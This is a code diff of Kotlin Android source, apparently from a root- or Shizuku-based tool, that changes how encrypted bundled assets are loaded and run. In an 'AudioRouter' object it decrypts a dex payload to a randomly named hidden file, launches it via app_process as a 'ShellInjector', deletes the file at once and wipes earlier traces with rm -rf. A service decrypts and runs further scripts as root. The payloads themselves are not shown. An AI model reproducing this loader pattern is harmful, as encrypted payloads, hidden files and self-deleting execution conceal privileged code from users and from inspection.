@@ -1060,30 +1060,20 @@ object AudioRouter {
                 }
 
                 try {
-                    // 🚀 CLEANUP: Purane sabhi leaked folders/files ko delete karo
+                    // 🚀 CLEANUP: Purane saare gucci folders delete kar do
                     if (useShizuku) {
-                        shizukuProcess("rm -rf /data/local/tmp/gucci_voice /data/local/tmp/gucci_audio /data/local/tmp/gucci_injector.dex /data/local/tmp/.gucci_audio")?.waitFor()
+                        shizukuProcess("rm -rf /data/local/tmp/gucci_* /data/local/tmp/.sys_* /data/local/tmp/.a_* /data/local/tmp/.v_*")?.waitFor()
                     }
 
                     val dexBytes = AssetDecryptor.decryptAssetToBytes(context, "sys_3.bin")
                     
-                    // Random hidden folder & file (su3)
-                    val randomFolder = ".v_${UUID.randomUUID().toString().replace("-", "")}"
-                    val randomFile = "su3" // 🚀 Naam su3 rakha hai, koi dex nahi
-                    
-                    val dirPath = if (useRoot) {
-                        File(context.cacheDir, randomFolder).also { it.mkdirs() }.absolutePath
-                    } else {
-                        val baseTmp = "/data/local/tmp/$randomFolder"
-                        shizukuProcess("mkdir -p '$baseTmp' && chmod 700 '$baseTmp'")?.waitFor()
-                        baseTmp
-                    }
-                    
-                    val tmpPath = "$dirPath/$randomFile"
+                    // 🚀 Sirf 1 random file, koi folder nahi
+                    val randomFile = ".su3_${UUID.randomUUID().toString().replace("-", "")}"
+                    val tmpPath = if (useRoot) File(context.cacheDir, randomFile).absolutePath else "/data/local/tmp/$randomFile"
 
                     if (useRoot) {
                         File(tmpPath).writeBytes(dexBytes)
-                        ProcessBuilder("su", "-c", "chmod 700 '$dirPath' && chmod 400 '$tmpPath'").start().waitFor()
+                        ProcessBuilder("su", "-c", "chmod 400 '$tmpPath'").start().waitFor()
                     } else {
                         val p = shizukuProcess("cat > '$tmpPath' && chmod 400 '$tmpPath'") ?: throw Exception("Shizuku write failed")
                         p.outputStream.write(dexBytes)
@@ -1091,13 +1081,12 @@ object AudioRouter {
                         p.waitFor()
                     }
 
-                    // 🚀 UNLINK TRICK: Start process, delete file and folder instantly
+                    // 🚀 UNLINK TRICK: Start process, delete file instantly
                     val script = """
                         export CLASSPATH='$tmpPath'
                         app_process /system/bin com.example.shtile.ShellInjector <&0 &
                         PID=${'$'}!
                         rm -f '$tmpPath'
-                        rmdir '$dirPath'
                         wait ${'$'}PID
                     """.trimIndent()
                     
@@ -1522,10 +1511,12 @@ class RunnerService : Service() {
             try { 
                 val p = getSharedPreferences("GucciPrefs", MODE_PRIVATE); 
                 val isBrutal = (a == "BRUTAL")
+                
+                // 🚀 FIX: Use encrypted asset names
                 val assetName = if (isBrutal) "sys_2.bin" else "sys_1.bin"
                 val execName = if (isBrutal) "sys_brutal" else "sys_core"
 
-                // 🚀 Decrypt script from assets
+                // 🚀 Decrypt and write to cache
                 val decBytes = AssetDecryptor.decryptAssetToBytes(this, assetName)
                 val tempFile = File(cacheDir, execName)
                 tempFile.writeBytes(decBytes)
@@ -1539,7 +1530,6 @@ class RunnerService : Service() {
                     stopSelf(); return@Thread 
                 }
 
-                // 🚀 Move to hidden tmp dir, execute, and cleanup
                 val inputCmd = if (isBrutal) "(echo 2; sleep 5; echo ${p.getString("brutal_option", "7")}; sleep 2)" else "(sleep 4; echo '$k'; sleep 2)"
                 
                 val cmd = """
@@ -1553,9 +1543,21 @@ class RunnerService : Service() {
                     rm -rf '$randDir'
                 """.trimIndent()
 
+                // 🚀 Turbo/Boost requires Root
                 val pr = ProcessBuilder("su", "-c", cmd).redirectErrorStream(true).start(); 
-                pr.inputStream.bufferedReader().readText(); pr.waitFor() 
-            } catch (e: Exception) {}; 
+                val out = pr.inputStream.bufferedReader().readText()
+                pr.waitFor() 
+                
+                Handler(Looper.getMainLooper()).post { 
+                    if (out.contains("Permission denied") || out.contains("not found")) {
+                        Toast.makeText(applicationContext, "❌ Root required for Boost/Turbo", Toast.LENGTH_LONG).show()
+                    } else {
+                        Toast.makeText(applicationContext, "✅ ${if(isBrutal) "Turbo" else "Boost"} Loaded", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            } catch (e: Exception) {
+                Handler(Looper.getMainLooper()).post { Toast.makeText(applicationContext, "Error: ${e.message}", Toast.LENGTH_LONG).show() }
+            }; 
             stopForeground(true); stopSelf() 
         }.start(); 
         return START_NOT_STICKY 
